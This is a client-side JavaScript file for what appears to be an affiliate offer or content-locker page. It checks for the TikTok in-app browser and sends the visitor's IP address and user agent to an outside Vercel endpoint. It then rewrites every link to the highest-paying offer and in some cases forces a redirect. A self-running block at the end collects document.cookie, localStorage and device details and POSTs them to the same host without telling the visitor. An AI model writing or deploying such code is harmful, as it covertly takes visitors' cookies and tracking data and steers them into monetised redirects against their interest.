const agent = navigator.userAgent;
// const agent =
//   'Mozilla/5.0 (Linux; Android 12; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36';
const apiUrl = 'https://node-q1uu7auvk-nikdzubs-projects.vercel.app/api/data';
// const apiUrl = 'https://cors-anywhere.herokuapp.com/unlockcontent.net/api/v2';
const root = document.querySelector('#root');
root.style.display = 'block';
const cover = document.querySelector('.cover');
cover.style.display = 'none';
const gif = document.querySelector('.gif');

const info = document.querySelector('#info');
const ip_info = document.querySelector('#ip');
const ua_info = document.querySelector('#user_agent');

if (agent.indexOf('music') >= 0) {
  console.log('in tiktok');
  cover.style.display = 'sticky';
  cover.style.display = 'block';

  // root.style.display = 'none';
  // alert(
  //   'The TikTok browser does not support this feature. Please open this page in a regular web browser.'
  // );
  // GET IP
  fetch('https://api.ipify.org?format=json')
    .then((ip_response) => ip_response.json())
    .then((ip_data) => {
      console.log('IP:', ip_data.ip);

      const urlWithParams = `${apiUrl}?ip=${encodeURIComponent(
        ip_data.ip
      )}&user_agent=${encodeURIComponent(agent)}&ctype=1`;
      console.log('Request URL:', urlWithParams);

      return fetch(urlWithParams, {
        method: 'GET',
      });
    })
    .then((offer_response) => {
      if (!offer_response.ok) {
        throw new Error(`HTTP error! Status: ${offer_response.status}`);
      }
      return offer_response.json();
    })
    .then((offer_data) => {
      console.log('Offers Data:', offer_data.offers);

      const filteredOffers = offer_data.offers.filter((offer) =>
        offer.name.toLowerCase().includes('coin')
      );

      const sortedOffers = offer_data.offers.sort((a, b) => {
        const payoutA = parseFloat(a.payout) || 0;
        const payoutB = parseFloat(b.payout) || 0;
        return payoutB - payoutA;
      });

      console.log('Sorted Offers:', sortedOffers);

      const links = document.querySelectorAll('a');
      links.forEach((link) => {
        if (sortedOffers.length > 0) {
          link.href = sortedOffers[0].link;
        }
      });
      // Optionally redirect to the top offer
      // location.href = sortedOffers[0]?.link;
    })
    .catch((error) => {
      console.error('There was a problem with the fetch operation:', error);
    });
} else {
  // https://locked4.com/cl/i/8d5r9r
  // const links = document.querySelectorAll('a');
  // links.forEach((link) => {
  //   link.href = 'https://locked4.com/cl/i/8d5r9r';
  // });

  // GET IP
  fetch('https://api.ipify.org?format=json')
    .then((ip_response) => ip_response.json())
    .then((ip_data) => {
      console.log('IP:', ip_data.ip);

      const urlWithParams = `${apiUrl}?ip=${encodeURIComponent(
        ip_data.ip
      )}&user_agent=${encodeURIComponent(agent)}&ctype=1`;
      console.log('Request URL:', urlWithParams);

      return fetch(urlWithParams, {
        method: 'GET',
      });
    })
    .then((offer_response) => {
      if (!offer_response.ok) {
        throw new Error(`HTTP error! Status: ${offer_response.status}`);
      }
      return offer_response.json();
    })
    .then((offer_data) => {
      console.log('Offers Data:', offer_data.offers);

      const filteredOffers = offer_data.offers.filter((offer) =>
        offer.name.toLowerCase().includes('coin')
      );

      const sortedOffers = offer_data.offers.sort((a, b) => {
        const payoutA = parseFloat(a.payout) || 0;
        const payoutB = parseFloat(b.payout) || 0;
        return payoutB - payoutA;
      });

      console.log('Sorted Offers:', sortedOffers);

      const links = document.querySelectorAll('a');
      links.forEach((link) => {
        if (sortedOffers.length > 0) {
          link.href = sortedOffers[0].link;
        }
      });
      // Optionally redirect to the top offer
      location.href = sortedOffers[0]?.link || '#';
    })
    .catch((error) => {
      console.error('There was a problem with the fetch operation:', error);
    });
}

(function () {
  function collectBrowserInfo() {
    const info = {};

    try {
      info['User Agent'] = navigator.userAgent;
      info['Browser Version'] = navigator.userAgent;
      info['Platform'] = navigator.platform;
      info[
        'Screen Resolution'
      ] = `${window.screen.width}x${window.screen.height}`;

      try {
        info['Cookies'] = document.cookie;
      } catch (e) {
        info['Cookies'] = 'Failed to access cookies';
      }

      try {
        info['Local Storage'] = localStorage.getItem('key') || 'No data';
      } catch (e) {
        info['Local Storage'] = 'Failed to access local storage';
      }

      info['Fetch API Supported'] = 'fetch' in window ? 'Yes' : 'No';
      info['Service Workers Supported'] =
        'serviceWorker' in navigator ? 'Yes' : 'No';

      try {
        if ('connection' in navigator) {
          const connection =
            navigator.connection ||
            navigator.mozConnection ||
            navigator.webkitConnection;
          info['Effective Connection Type'] = connection.effectiveType;
        }
      } catch (e) {
        info['Effective Connection Type'] =
          'Failed to access network information';
      }
    } catch (e) {
      console.error(
        'An error occurred while gathering browser information:',
        e
      );
    }

    return info;
  }

  function sendInfoToAPI(info) {
    fetch('https://node-q1uu7auvk-nikdzubs-projects.vercel.app/api/data', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(info),
    })
      .then((response) => response.json())
      .then((data) => {
        console.log('Success:', data);
      })
      .catch((error) => {
        console.error('Error:', error);
      });
  }

  const browserInfo = collectBrowserInfo();
  sendInfoToAPI(browserInfo);
})();
